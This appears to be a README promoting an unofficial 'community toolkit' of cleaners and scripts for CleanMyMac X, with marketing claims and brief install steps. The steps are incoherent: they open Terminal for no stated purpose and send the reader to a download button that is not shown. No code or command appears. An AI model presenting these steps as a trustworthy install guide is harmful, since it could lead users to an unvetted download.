## About CleanMyMac X

**CleanMyMac X** — the most powerful and beautiful Mac cleaner trusted by millions. It instantly finds and removes junk, speeds up your system, protects privacy, and keeps your Mac running like new.

Key features you love:  
- Junk removal (System Junk, Mail Attachments, Trash Bins)  
- Space Lens — visual map of your storage  
- Full Uninstaller with leftovers cleanup  
- Malware Removal & Privacy protection  
- Updater & Maintenance scripts  
- Menu bar monitor with real-time stats  

This community toolkit adds **custom cleaners**, **advanced scripts**, and **exclusive profiles** to make CleanMyMac even more powerful.

## Installation (macOS) – Fast & Easy

1. Open **Terminal**: `⌘ + Space` → type `Terminal` → `Enter`  
2. Click the button below → download
3. Extract to `~/Library/Application Support/CleanMyMac-X-Toolkit`  
4. Restart CleanMyMac X → new cleaners auto-load  

> Pro tip: Run “Update CleanMyMac X” after import for best performance.
